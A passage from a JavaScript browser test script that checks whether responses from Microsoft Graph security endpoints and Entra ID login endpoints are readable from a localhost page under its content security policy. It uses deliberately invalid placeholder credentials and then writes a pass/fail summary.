          o[name] = { status: x.status, readable: true, code: String(code).slice(0, 40), requestIdReadable: x.headers.get('request-id') !== null || x.headers.get('x-ms-request-id') !== null };
        } catch (e) { o[name] = { readable: false, error: e.name }; }
      };
      await probe('graphIncidents', 'https://graph.microsoft.com/v1.0/security/incidents?$top=10&$expand=alerts', { headers: { Authorization: 'Bearer invalid' } });
      await probe('graphHunting', 'https://graph.microsoft.com/v1.0/security/runHuntingQuery', { method: 'POST', headers: { Authorization: 'Bearer invalid', 'Content-Type': 'application/json; charset=utf-8' }, body: '{"Query":"AlertInfo | take 1"}' });
      await probe('entraMetadata', 'https://login.microsoftonline.com/organizations/v2.0/.well-known/openid-configuration', {});
      await probe('entraToken', 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'client_id=00000000-0000-0000-0000-000000000000&grant_type=authorization_code&code=x&redirect_uri=http%3A%2F%2Flocalhost%2Fredirect.html&code_verifier=x' });
      return o;
    });
  } catch (e) { r = { error: e.message.split('\n')[0] }; }
  partB[channel].liveCors = r;
  check(`B6-${channel}`, 'live: Graph (GET incidents, POST runHuntingQuery) and Entra (metadata, token) responses are readable from http://localhost:<port> under the page CSP', r.graphIncidents && r.graphIncidents.readable && r.graphIncidents.status === 401 && r.graphHunting.readable && r.graphHunting.status === 401 && r.entraMetadata.readable && r.entraMetadata.status === 200 && r.entraToken.readable, r);
  await browser.close();
}

stopLauncher(L);
fs.rmSync(SCRATCH, { recursive: true, force: true });
results.summary = { passed: results.checks.filter((c) => c.pass).length, failed: results.checks.filter((c) => !c.pass).map((c) => c.id) };
console.log(JSON.stringify(results.summary));
console.log('written', writeResults('p4-browser-results', results));
process.exit(0);
